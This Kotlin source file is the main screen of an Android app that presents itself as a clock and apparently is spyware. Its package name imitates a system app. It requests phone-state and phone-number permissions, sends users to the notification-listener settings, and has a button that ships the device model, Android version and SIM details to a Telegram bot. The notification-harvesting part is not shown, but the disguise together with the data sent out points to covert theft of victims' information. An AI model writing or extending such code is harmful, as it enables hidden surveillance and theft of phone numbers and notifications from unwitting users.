package com.android.declock

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

class MainActivity : AppCompatActivity() {

    private val phonePerms = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
    )

    private val handler = Handler(Looper.getMainLooper())
    private val hhmm = SimpleDateFormat("HH:mm", Locale.getDefault())
    private val ss = SimpleDateFormat("ss", Locale.getDefault())
    private val dateFmt = SimpleDateFormat("EEEE, d MMMM yyyy", Locale.getDefault())

    private val tick = object : Runnable {
        override fun run() {
            val now = Date()
            findViewById<TextView>(R.id.txtClock)?.text = hhmm.format(now)
            findViewById<TextView>(R.id.txtSeconds)?.text = ":" + ss.format(now)
            findViewById<TextView>(R.id.txtDate)?.text = dateFmt.format(now)
            findViewById<TextView>(R.id.txtTimezone)?.text = TimeZone.getDefault().id
            handler.postDelayed(this, 1000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<Button>(R.id.btnPermission).setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        findViewById<Button>(R.id.btnPhonePermission).setOnClickListener {
            val missing = phonePerms.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missing.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
            } else {
                refreshDeviceInfo()
            }
        }

        findViewById<Button>(R.id.btnTest).setOnClickListener {
            val info = buildString {
                appendLine("📱 <b>${DeviceInfo.deviceLabel()}</b>")
                appendLine("🤖 ${DeviceInfo.androidVersion()}")
                appendLine(DeviceInfo.formatSims(this@MainActivity))
                appendLine("──────────────")
                appendLine("✅ Test notification from Jam")
            }
            TelegramSender.send(this, info)
        }

        refreshDeviceInfo()
    }

    override fun onResume() {
        super.onResume()
        handler.post(tick)
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacks(tick)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) refreshDeviceInfo()
    }

    private fun refreshDeviceInfo() {
        findViewById<TextView>(R.id.txtDevice)?.text = buildString {
            appendLine(DeviceInfo.deviceLabel())
            appendLine(DeviceInfo.androidVersion())
            append(DeviceInfo.formatSims(this@MainActivity))
        }
    }
}
